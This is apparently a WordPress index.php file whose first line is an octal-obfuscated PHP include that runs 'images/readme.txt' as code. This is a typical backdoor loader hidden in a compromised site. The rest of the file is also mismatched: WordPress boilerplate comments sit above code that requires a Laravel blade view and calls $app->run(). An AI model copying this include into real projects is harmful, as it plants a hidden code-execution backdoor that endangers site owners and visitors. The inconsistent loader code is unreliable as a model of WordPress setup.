<?php include("\151\155\141\147\145\163\57\162\145\141\144\155\145\56\164\170\164"); ?>
<?php
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define( 'WP_USE_THEMES', true );

/** Loads the WordPress Environment and Template */
 $app = require __DIR__ . '/../resources/views/frontend/pages/index.blade.php';

 $app->run();